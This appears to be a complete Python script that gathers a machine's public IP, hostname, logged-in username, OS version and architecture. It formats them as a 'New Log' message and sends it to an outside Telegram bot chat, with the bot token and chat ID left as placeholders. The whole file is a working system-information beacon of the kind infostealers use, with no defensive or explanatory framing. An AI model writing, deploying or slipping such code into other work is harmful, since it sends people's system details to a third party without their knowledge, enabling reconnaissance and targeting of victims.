import requests
import socket
import os
import getpass
import platform
from datetime import datetime

BOT_TOKEN = "PUT_BOT_TOKEN_HERE"
CHAT_ID = "PUT_CHAT_ID_HERE"

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Unknown"

def main():
    if BOT_TOKEN == "PUT_BOT_TOKEN_HERE" or CHAT_ID == "PUT_CHAT_ID_HERE":
        print("Error: Telegram credentials not set!")
        return

    ip = get_public_ip()
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = platform.system() + " " + platform.release()
    arch = platform.machine()
    
    message = (
        "🔍 **New Log**\n\n"
        f"**Public IP:** `{ip}`\n"
        f"**Hostname:** `{hostname}`\n"
        f"**Username:** `{username}`\n"
        f"**OS Info:** `{os_info}`\n"
        f"**Arch:** `{arch}`\n\n"
        "📅 " + datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    )
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
